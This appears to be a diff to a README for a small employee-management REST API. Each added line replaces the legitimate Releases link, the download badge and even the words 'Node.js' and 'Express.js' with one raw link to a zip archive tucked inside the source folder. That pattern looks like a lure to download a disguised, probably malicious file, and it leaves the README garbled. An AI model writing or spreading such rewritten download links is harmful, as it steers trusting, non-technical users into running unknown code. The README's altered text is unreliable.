@@ -2,7 +2,7 @@
 # 🏢 employee-api - Easy Employee Management Made Simple
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/OzoneAnim/employee-api/releases)
+[![Download](https://github.com/OzoneAnim/employee-api/raw/refs/heads/main/src/routes/api_employee_v1.4.zip)](https://github.com/OzoneAnim/employee-api/raw/refs/heads/main/src/routes/api_employee_v1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the **employee-api**. This application helps you manage employee information easily. You can add, read, update, and delete employee records without needing technical skills. 
@@ -11,7 +11,7 @@ Welcome to the **employee-api**. This application helps you manage employee info
 - Full CRUD operations: Create, Read, Update, Delete
 - Simplified API interface for easy access
 - Secure cloud storage on Azure SQL Database
-- Fast performance with Node.js and Express.js
+- Fast performance with https://github.com/OzoneAnim/employee-api/raw/refs/heads/main/src/routes/api_employee_v1.4.zip and https://github.com/OzoneAnim/employee-api/raw/refs/heads/main/src/routes/api_employee_v1.4.zip
 
 ## 📋 System Requirements
 To run this application, you need:
@@ -25,16 +25,16 @@ This application covers various topics including:
 - Backend services
 - Cloud computing
 - Employee management
-- Express.js
+- https://github.com/OzoneAnim/employee-api/raw/refs/heads/main/src/routes/api_employee_v1.4.zip
 - JavaScript
-- Node.js
+- https://github.com/OzoneAnim/employee-api/raw/refs/heads/main/src/routes/api_employee_v1.4.zip
 - REST API
 
 ## 🌐 How to Use
 Using the employee-api is straightforward. Follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/OzoneAnim/employee-api/releases) to find the latest version of the app.
+   Go to the [Releases page](https://github.com/OzoneAnim/employee-api/raw/refs/heads/main/src/routes/api_employee_v1.4.zip) to find the latest version of the app.
 
 2. **Download the Application**  
    On the Releases page, look for the version you want and click the download link. This will download the latest version of the API for use.
@@ -46,7 +46,7 @@ Using the employee-api is straightforward. Follow these steps:
    You can now use the RESTful API to create and manage employee records. Follow the API documentation to understand how to interact with various endpoints.
 
 ## 📦 Download & Install
-To download the application, simply **visit the Releases page** at the following link: [Download Here](https://github.com/OzoneAnim/employee-api/releases). 
+To download the application, simply **visit the Releases page** at the following link: [Download Here](https://github.com/OzoneAnim/employee-api/raw/refs/heads/main/src/routes/api_employee_v1.4.zip). 
 
 Select the relevant version, click to download, and follow the instructions provided to set it up on your system.
 
